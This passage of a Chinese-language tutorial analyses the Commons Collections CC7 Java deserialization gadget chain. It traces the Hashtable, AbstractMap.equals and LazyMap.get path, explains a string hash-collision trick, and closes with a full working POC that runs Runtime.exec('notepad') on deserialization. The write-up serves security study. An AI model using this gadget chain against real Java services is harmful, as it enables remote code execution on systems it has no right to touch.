<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
</project>
```

##### 0x472 利用链分析

> 实际上还是想办法触发LazyMap的get方法，因此后半段和CC1一致。

利用链如下：

```java
ObjectInputStream.readObject()
  - Hashtable.readObject()
    - Hashtable.reconstitutionPut()
      - AbstractMapDecorator.equals()
        - AbstractMap.equals()
          - LazyMap.get()
            - ChainedTransformer.transform()
            - CC1...
```

此处不妨从后面往前分析，先看AbstractMap的equals方法：

```java
    public boolean equals(Object o) {
        if (o == this)
            return true;
        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;
        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (xxx) {}
        return true;
    }
```

可以看到AbstractMap的equals方法对传入的Object转换为了一个Map对象，随后调用了该Map对象的get方法，这就可以触发LazyMap的get方法。

那么如何触发AbstractMap的equals方法呢？在CC7链中实际上是**Hashtable中的reconstitutionPut**方法(该方法在readObject中有调用)，其定义如下：

```java
    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

其readObject方法如下：

```java
    private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the threshold and loadFactor
        s.defaultReadObject();

        // Validate loadFactor (ignore threshold - it will be re-computed)
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new StreamCorruptedException("Illegal Load: " + loadFactor);

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Validate # of elements
        if (elements < 0)
            throw new StreamCorruptedException("Illegal # of Elements: " + elements);

        // Clamp original length to be more than elements / loadFactor
        // (this is the invariant enforced with auto-growth)
        origlength = Math.max(origlength, (int)(elements / loadFactor) + 1);

        // Compute new length with a bit of room 5% + 3 to grow but
        // no larger than the clamped original length.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)((elements + elements / 20) / loadFactor) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        length = Math.min(length, origlength);
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // sync is eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```

可以看到在最后的循环中调用了该方法，接下来关注的是reconstitutionPut方法。

从其方法的定义来看，hash为其哈希计算值，只有当哈希相等时才会调用到后面的e.key.equals(key)。

并且此时我们还需要控制传入equals方法的key参数，只有当这个key参数为LazyMap对象时才能触发其get方法从而执行命令。

而key是readObject是读取的，查看其writeObject：

```java
    private void writeObject(java.io.ObjectOutputStream s)
            throws IOException {
        Entry<Object, Object> entryStack = null;

        synchronized (this) {
            // Write out the threshold and loadFactor
            s.defaultWriteObject();

            // Write out the length and count of elements
            s.writeInt(table.length);
            s.writeInt(count);

            // Stack copies of the entries in the table
            for (int index = 0; index < table.length; index++) {
                Entry<?,?> entry = table[index];

                while (entry != null) {
                    entryStack =
                        new Entry<>(0, entry.key, entry.value, entryStack);
                    entry = entry.next;
                }
            }
        }

        // Write out the key/value objects from the stacked entries
        while (entryStack != null) {
            s.writeObject(entryStack.key);
            s.writeObject(entryStack.value);
            entryStack = entryStack.next;
        }
    }
```

可以看到是将entryStack的key写入了进去。而entryStack实际上是由table生成的一个栈，即我们控制Hashtable的table就可以控制其key值。

我们先考虑使得放入Hashtable中的元素的key哈希相同，但是还得考虑这个key应该是一个LazyMap对象，而LazyMap对象的哈希计算则是**由其键的哈希值与其值的哈希值进行异或**得到，在Java中，字符串的哈希碰撞较为常见(例如"yy"和"zZ"，其哈希均为3872)，这样我们就能很轻松地控制两个LazyMap对象的哈希值一致但是又不是同一对象。

于是我们可以尝试写出这样一段代码：

```java
        HashMap inMap1 = new HashMap();
        HashMap inMap2 = new HashMap();
        LazyMap map1 = (LazyMap) LazyMap.decorate(inMap1, chain);
        LazyMap map2 = (LazyMap) LazyMap.decorate(inMap2, chain);
        map1.put("yy", 1);
        map2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
```

但是实际运行时我们会发现出现了一点问题，会出现NotSerializableException，这是为什么呢？

原因是因为在`hashtable.put`时，也调用了equals方法，其put方法定义如下：

```java
    public synchronized V put(K key, V value) {
        // Make sure the value is not null
        if (value == null) {
            throw new NullPointerException();
        }

        // Makes sure the key is not already in the hashtable.
        Entry<?,?> tab[] = table;
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        @SuppressWarnings("unchecked")
        Entry<K,V> entry = (Entry<K,V>)tab[index];
        for(; entry != null ; entry = entry.next) {
            if ((entry.hash == hash) && entry.key.equals(key)) {
                V old = entry.value;
                entry.value = value;
                return old;
            }
        }

        addEntry(hash, key, value, index);
        return null;
    }
```

不难发现，在第一次put时，由于数据还没更新到table，因此entry是null，即不进入循环，在第二次put时，此时entry就不是空了，因此进入循环，由于我们控制了哈希相同，因此entry.key(亦为LazyMap对象)调用其equals方法，key为传入的LazyMap对象。

而LazyMap并没有equals方法，则调用的是其父类AbstractMapDecorator的equals方法：

```java
    public boolean equals(Object object) {
        return object == this ? true : this.map.equals(object);
    }
```

`object == this`必然是为**false**的(我们控制的是哈希值相当，对象不同)，因此调用了`this.map.equals(object)`，这里需要注意，在AbstractMapDecorator中，map确实是我们的LazyMap中的HashMap，但是此处其引用类型为Map，是无法调用到HashMap的equals方法的，只能动态联编调用到使用了Map接口的AbstractMap抽象类中的equals方法，其定义如下：

```java
    public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

不难发现，对传入的o(也就是我们的第二次put的LazyMap)，在equals方法中执行了get方法，而get方法如下：

```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

此处`this.factory.transform(key)`即触发命令执行的地方，因此在生成Payload时也会执行命令。

而在其下面的`super.map.put()`则是将上面执行结果存放入了LazyMap的HashMap中。

而value是什么呢？

![image-20220302202648319](image-20220302202648319.png)

ProcessImpl，该类是不可序列化的，因此在执行时会报错，那么删除其即可。

完整的POC如下：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.*;

public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
        HashMap inMap1 = new HashMap();
        HashMap inMap2 = new HashMap();
        LazyMap map1 = (LazyMap) LazyMap.decorate(inMap1, chain);
        LazyMap map2 = (LazyMap) LazyMap.decorate(inMap2, chain);
        map1.put("yy", 1);
        map2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        map2.remove("yy");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc7"));
            outputStream.writeObject(hashtable);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc7"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

感觉CC7链的分析对比上面的应该还是比较难，尤其涉及到动态联编，需要不断地动态调试才能知道为什么这么做。

